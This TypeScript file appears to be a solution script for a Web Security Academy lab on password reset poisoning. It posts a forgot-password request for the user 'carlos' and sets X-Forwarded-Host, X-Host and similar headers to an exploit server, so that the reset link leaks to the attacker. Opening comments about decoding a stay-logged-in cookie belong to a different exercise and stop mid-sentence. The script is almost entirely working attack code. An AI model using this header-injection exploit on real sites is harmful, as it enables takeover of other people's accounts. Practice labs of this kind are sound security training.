// 1. Retrieved stay logged in cookie from chrome dev tools on the my accounts page
// 2. Base64 decoded the cookie with the result: wiener:51dc30ddc473d43a6011e9ebba6ca770
// 3. Base

import axios, { AxiosResponse } from "axios";
import * as fs from "fs";
import * as crypto from "crypto";

axios.defaults.withCredentials = true;

const subdomain = "0a21000d03a5babac062be4c00440016";
const forgotPasswordURL = `https://${subdomain}.web-security-academy.net/forgot-password`;

const main = async () => {
  try {
    await axios.post(
      forgotPasswordURL,
      "csrf=C4rytkQdfIk5pKzyoHtMYSSPrcoMiaM8&username=carlos",
      {
        headers: {
          accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
          "accept-language": "en-US,en;q=0.9,es;q=0.8",
          "cache-control": "max-age=0",
          "content-type": "application/x-www-form-urlencoded",
          "sec-ch-ua":
            '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
          "sec-ch-ua-mobile": "?0",
          "sec-fetch-dest": "document",
          "sec-ch-ua-platform": '"macOS"',
          "sec-fetch-mode": "navigate",
          "sec-fetch-site": "same-origin",
          "sec-fetch-user": "?1",
          "upgrade-insecure-requests": "1",
          cookie: "session=4nlNbeH2HSABXS7Cu9uzTDAYEBcAHNAq",
          // Referer:
          // "https://0a960085043c040ac0401090009600f2.web-security-academy.net/forgot-password",
          // "Referrer-Policy": "strict-origin-when-cross-origin",
          Host: `${subdomain}.web-security-academy.net`,
          // @ts-ignore
          "X-Forwarded-Host":
            "exploit-0afd00150375ba16c0abbebd014500bc.web-security-academy.net",
          "X-Forwarded-Server":
            "exploit-0afd00150375ba16c0abbebd014500bc.web-security-academy.net",
          "X-HTTP-Host-Override":
            "exploit-0afd00150375ba16c0abbebd014500bc.web-security-academy.net",
          "X-Host":
            "exploit-0afd00150375ba16c0abbebd014500bc.web-security-academy.net",
          // Origin:
          //   "https://exploit-0afd00150375ba16c0abbebd014500bc.web-security-academy.net",
        },
      }
    );
  } catch (e) {
    console.log(e);
    throw e;
    ``;
  }
};

try {
  main();
} catch (e) {
  console.log(e);
  throw e;
}

// fetch(
//   "https://0a21000d03a5babac062be4c00440016.web-security-academy.net/forgot-password",
//   {
//     headers: {
//       accept:
//         "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
//       "accept-language": "en-US,en;q=0.9,es;q=0.8",
//       "cache-control": "max-age=0",
//       "content-type": "application/x-www-form-urlencoded",
//       "sec-ch-ua":
//         '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
//       "sec-ch-ua-mobile": "?0",
//       "sec-ch-ua-platform": '"macOS"',
//       "sec-fetch-dest": "document",
//       "sec-fetch-mode": "navigate",
//       "sec-fetch-site": "same-origin",
//       "sec-fetch-user": "?1",
//       "upgrade-insecure-requests": "1",
//       cookie: "session=4nlNbeH2HSABXS7Cu9uzTDAYEBcAHNAq",
//       Referer:
//         "https://0a21000d03a5babac062be4c00440016.web-security-academy.net/forgot-password",
//       "Referrer-Policy": "strict-origin-when-cross-origin",
//     },
//     body: "username=carlos",
//     method: "POST",
//   }
// );
